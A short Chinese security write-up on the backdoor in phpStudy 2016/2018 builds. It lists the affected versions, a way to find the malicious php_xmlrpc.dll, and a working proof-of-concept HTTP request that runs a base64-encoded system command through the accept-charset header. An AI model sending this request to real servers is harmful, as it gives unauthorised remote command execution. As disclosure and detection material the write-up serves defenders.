# phpstudy后门

![](https://s2.ax1x.com/2019/09/24/uAxE2n.jpg)

 ## 0x01 前言 

 phpstudy是一个php运行环境的集成包，用户不需要去配置运行环境，就可以使用

## 0x02 问题版本

phpStudy2016 ：php-5.2.17、php-5.4.45 

phpStudy2018 ：php-5.2.17、php-5.4.45

## 0x03 排查方法

1.问题文件为：php_xmlrpc.dll，在每个php版本目录的ext目录下面都有一个

2.用记事本打开，CTRL+F搜索eval，有```@eval(%s('%s'));    %s;@eval(%s('%s')); $V='%s';$M='%s';``字样的代表存在后门

![](https://s2.ax1x.com/2019/09/24/ukxPTe.png)

## 0x04 后门复现

poc: 【poc放出来源**圈子社区**】

```http
GET /caijue.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
accept-charset: ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7
Accept-Encoding: gzip,deflate
Cookie: PHPSESSID=fg6b95loelkml2384i5lg7d4l3
DNT: 1
X-Forwarded-For: 8.8.8.8
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

```

注意点：Accept-Encoding: gzip,deflate 两种编码方式之间没有空格

​               accept-charset: ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7 执行的命令base64加密

![](https://s2.ax1x.com/2019/09/24/uASsL6.md.png)

## 0x05 修复方式

等官网发布修复版本吧

